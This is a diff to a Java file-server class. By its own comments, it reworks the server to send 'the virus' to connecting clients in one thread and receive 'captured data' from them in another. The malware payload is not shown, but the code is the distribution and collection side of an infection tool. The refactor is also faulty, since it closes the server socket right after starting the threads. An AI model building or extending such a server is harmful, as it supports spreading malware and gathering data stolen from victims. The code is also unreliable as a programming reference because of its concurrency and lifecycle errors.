@@ -41,45 +41,78 @@ public class SimpleFileServer {
   public void  WaitConnect() throws IOException {
     
     try {
-      servsock = new ServerSocket(SOCKET_PORT);
-      while (true) {
-    	  
-    	///*** SendFile***\\\
-        System.out.println("Waiting...");
-        try {
-          sock = servsock.accept();
-          System.out.println("Accepted connection : " + sock);
+    	//Create's a new tread that it used to send the virus to the client
+    	Thread send = new Thread(new Runnable() {
+			public void run() {
+				try {
+					SendFile();
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			}
+		});
+        
+    	//Create's a new tread that it's used to receive the captured data from the client.
+    	Thread recive = new Thread(new Runnable() {
+			public void run() {
+				try {
+					ReciveFile();
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			}
+		});
           
-          send.Sending();
-         
-        }
-        finally {
-          if (bis != null) bis.close();
-          if (os != null) os.close();
-          if (sock!=null) sock.close();
-        }
-        
-      ///*** ReciveFiel***\\\
-        System.out.println("Waiting...");
-        try {
-          sock = servsock.accept();
-          System.out.println("Accepted connection : " + sock);
-        
-          recive.Reciving();
-           
-        }
-        finally {
-          if (bis != null) bis.close();
-          if (os != null) os.close();
-          if (sock!=null) sock.close();
-        }
-        
-        
-        
-      }
+    	send.start();
+    	recive.start();
     }
     finally {
       if (servsock != null) servsock.close();
     }
   }
+  
+
+		///*** SendFile***\\\
+	  public synchronized void SendFile() throws IOException{
+		  servsock = new ServerSocket(SOCKET_PORT);
+	      while (true) { 
+	    	
+	        System.out.println("Waiting...");
+	        try {
+	          sock = servsock.accept();
+	          System.out.println("Accepted connection : " + sock);
+	          
+	          send.Sending();
+	         
+	        }
+	        finally {
+	          if (bis != null) bis.close();
+	          if (os != null) os.close();
+	          if (sock!=null) sock.close();
+	        }
+	      }
+	  }
+	      
+      ///*** ReciveFiel***\\\
+      public synchronized void ReciveFile() throws IOException{
+    	
+          System.out.println("Waiting...");
+          try {
+            sock = servsock.accept();
+            System.out.println("Accepted connection : " + sock);
+          
+            recive.Reciving();
+             
+          }
+          finally {
+            if (bis != null) bis.close();
+            if (os != null) os.close();
+            if (sock!=null) sock.close();
+          }
+      }
+  
+  
+  
 }
